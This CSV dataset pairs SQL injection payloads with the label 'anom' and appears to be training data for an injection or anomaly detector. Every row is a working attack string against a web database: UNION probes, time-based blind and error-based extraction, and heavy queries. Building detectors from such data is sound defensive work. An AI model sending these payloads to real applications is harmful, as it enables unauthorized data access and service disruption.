payload,label
"-1620)) union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",anom
"-2319 union all select 5068,5068,5068#",anom
"1"" or elt(6272=6272,sleep(5))",anom
"1""));select pg_sleep(5)--",anom
"1' where 1085=1085 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
-3304')) order by 1--,anom
"1""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""adwg"" like ""adwg",anom
"1%"")) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",anom
"1%"") union all select null,null,null,null,null#",anom
1') where 8776=8776 and 6969=(select 6969 from pg_sleep(5))--,anom
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",anom
"1%"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",anom
-3862') or 9323=9323#,anom
"-8425"")) or (6485=1127)*1127 and ((""qruf""=""qruf",anom
1');select pg_sleep(5)--,anom
"-2106"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""dvlq"" like ""dvlq",anom
"1%') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('%'='",anom
"1"") as gdcx where 2335=2335 and 6969=(select 6969 from pg_sleep(5))--",anom
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",anom
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'tmwy'='tmwy",anom
"1') and 8635=(select count(*) from generate_series(1,5000000))--",anom
"1'))) union all select null,null,null,null,null,null,null,null,null,null--",anom
1 rlike (select * from (select(sleep(5)))sgvo)# ewsz,anom
"1""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""text"" like ""text",anom
"-8203)) as eqlf where 6132=6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",anom
"1') where 9304=9304 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",anom
"1 where 8398=8398;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",anom
1 where 5161=5161 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,anom
1%') and 2006=2006,anom
"1' where 1628=1628 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
"1) as qjbd where 2808=2808 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",anom
"1"");select (case when (2676=4191) then 2676 else 1/(select 0) end)--",anom
"1')) or elt(6272=6272,sleep(5)) and (('zjel' like 'zjel",anom
1')) as txxn where 7884=7884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,anom
"1') as wtfo where 5666=5666 union all select null,null,null,null--",anom
-5299 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),anom
1 where 8532=8532;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,anom
1') where 9538=9538;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,anom
"1%')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",anom
"1""))) or sleep(5)#",anom
"1"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""vnei"" like ""vnei",anom
"1"")) as ylah where 9248=9248;select pg_sleep(5)--",anom
-3834')) as hhiy where 2086=2086 or 3038=3038,anom
"-4236') union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",anom
-2241) where 7606=7606 or (8459=8459)*4906--,anom
1')) as wqhm where 9871=9871;(select * from (select(sleep(5)))srmq)--,anom
1)) as rcbz where 4563=4563 and 2006=2006,anom
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",anom
-1459'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('eiet' like 'eiet,anom
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'xqkq'='xqkq",anom
1');if(7899=7899) select 7899 else drop function zbbp--,anom
"1"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""cwat"" like ""cwat",anom
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""zyoo""=""zyoo",anom
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",anom
"-9762) or elt(5773=8986,8986)",anom
"-8773%'))) union all select 8941,8941,8941,8941,8941,8941#",anom
"-4233%"") or (8459=8459)*4906 and (""%""=""",anom
1'||(select 'ptfi' from dual where 2234=2234 and 2006=2006,anom
"1%""))) union all select null,null,null,null,null,null--",anom
"1') union all select null,null,null,null,null,null#",anom
"1""))) or elt(6272=6272,sleep(5)) and (((""hxgu""=""hxgu",anom
"1))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",anom
"1 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))-- huss",anom
1') where 6305=6305 rlike (select (case when (8326=9749) then 1 else 0x28 end))--,anom
1'))) rlike sleep(5) and ((('zwyx'='zwyx,anom
"1')) as jpxj where 6153=6153 or 8156=(select count(*) from generate_series(1,5000000))--",anom
"1""))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",anom
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""mezx"" like ""mezx",anom
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""wtkx""=""wtkx",anom
"-6112"") union all select 8203,8203,8203,8203,8203,8203,8203--",anom
"1"") as tqxa where 6751=6751 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",anom
1'));waitfor delay '0:0:5'--,anom
"-5391 or make_set(9354=9354,7185)# ptyy",anom
"1%';select benchmark(5000000,md5(0x4c4d6142)) and '%'='",anom
"1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('ocfi'='ocfi",anom
"1) union all select null,null,null,null,null,null,null#",anom
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('%'='",anom
"1') where 8211=8211 union all select null,null,null,null,null#",anom
"1)) as ehlg where 6340=6340;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",anom
"1))) and 8635=(select count(*) from generate_series(1,5000000))--",anom
-3899') where 8152=8152 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,anom
"-6662"")) union all select 6755--",anom
"-1684""))) union all select 7473,7473#",anom
"1%"") and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""%""=""",anom
"-7101))) union all select 4587,4587,4587,4587,4587,4587--",anom
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",anom
"-6496""))) or 1471=5278 and (((""zkoj""=""zkoj",anom
"-8238')) union all select 9797,9797,9797,9797,9797,9797,9797,9797#",anom
1) where 3671=3671;(select * from (select(sleep(5)))srmq)--,anom
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('ohqs' like 'ohqs,anom
"1"") where 5719=5719 rlike sleep(5)--",anom
"1%"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""%""=""",anom
"1"")) and 5421=4804--",anom
"1"")) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((""tbdl"" like ""tbdl",anom
"1%'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",anom
"1' where 4880=4880 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",anom
"1%"");select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",anom
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",anom
"1""))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
1';select sleep(5)#,anom
1))) or 6793=(select 6793 from pg_sleep(5)) and (((3919=3919,anom
1')) as xkiq where 9008=9008 and sleep(5)--,anom
"1"" where 2235=2235 union all select null,null,null,null,null--",anom
-1219') or 5592=4835,anom
"1%"" and 6969=(select 6969 from pg_sleep(5)) and ""%""=""",anom
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",anom
"1') as kgnd where 1550=1550 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",anom
1' where 8159=8159 union all select null#,anom
"1) as qjjm where 3850=3850 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",anom
1'+(select ksoh where 6339=6339;begin dbms_lock.sleep(5); end)+',anom
"1)));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",anom
"-3924'||(select 'ssld' from dual where 6229=6229 union all select 6229,6229,6229,6229,6229#",anom
-8636'))) or 4301=7212--,anom
"1%""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""%""=""",anom
-7758%'))) or 3038=3038,anom
"1%"" rlike sleep(5) and ""%""=""",anom
"1%""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""%""=""",anom
"1%')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('%'='",anom
"1' and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
"1""));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",anom
"1"")) as sqzh where 5672=5672 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",anom
1') where 8128=8128;select (case when (4061=1396) then 4061 else 1/(select 0) end)--,anom
"-5780 or make_set(3464=4518,4518)-- icit",anom
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('jmjw' like 'jmjw",anom
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ckpm'='ckpm",anom
"-7700%') union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",anom
-1127 or 7391=4954,anom
1' in boolean mode) and (select * from (select(sleep(5)))gcrr)#,anom
-8876')) or 3038=3038,anom
"-1218' union all select 2663,2663,2663,2663--",anom
-1436' or 5699=5783--,anom
"-9583')) union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",anom
"-1663' or elt(1032=1032,3623) and 'yqaj' like 'yqaj",anom
1))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9548=9548,anom
"1' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",anom
1'||(select 'tznb' from dual where 8808=8808 rlike (select * from (select(sleep(5)))vwyq)#,anom
"1 and make_set(8403=8403,8899)",anom
"1"")) as dfwi where 9703=9703 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",anom
1) and 3861=5813--,anom
"-4419%"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",anom
"-9795) as wrgs where 5427=5427 union all select 5427,5427,5427,5427,5427,5427--",anom
"-4639""))) or 8550=9348",anom
1')));(select * from (select(sleep(5)))srmq) and ((('pfle' like 'pfle,anom
-3246%' union all select 4012#,anom
"1"") where 2088=2088 union all select null,null,null,null--",anom
1))) order by 1--,anom
"1%"") union all select null,null,null,null,null,null,null,null,null,null#",anom
"1'));select * from generate_series(4975,4975,case when (4975=9615) then 1 else 0 end) limit 1--",anom
1') rlike sleep(5) and ('qsub' like 'qsub,anom
"1'))) union all select null,null,null,null,null,null,null,null,null--",anom
-7277))) order by 1#,anom
"-1606'||(select 'qbaa' where 3967=3967 union all select 3967,3967,3967,3967,3967--",anom
"1') as qqyz where 2274=2274;iif(5257=5257,1,1/0)",anom
"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and 'efpc' like 'efpc",anom
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""uvzc"" like ""uvzc",anom
1'))) and 7533=7533 and ((('txex'='txex,anom
"1)) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",anom
"1%') union all select null,null,null,null,null,null,null,null,null,null#",anom
1;select pg_sleep(5),anom
"1%';call regexp_substring(repeat(right(char(2385),0),500000000),null)--",anom
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('ojkd'='ojkd",anom
1')) as wuws where 6917=6917 union all select null#,anom
"1') as bxae where 4143=4143 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",anom
"-6194"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",anom
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""zbwn"" like ""zbwn",anom
-9673) or 8571=8571--,anom
1);begin user_lock.sleep(5); end and (4610=4610,anom
"1%"" and 2006=2006",anom
"1%""))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",anom
"1'))) and elt(2506=2383,2383) and ((('bjrj'='bjrj",anom
"1%"")) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",anom
"1'||(select 'aoad' where 8795=8795 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",anom
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('adnz'='adnz",anom
-5031' or 9323=9323#,anom
"-9638))) or elt(1032=1032,3623) and (((3679=3679",anom
"1))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6265=6265",anom
-7864 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# twpw,anom
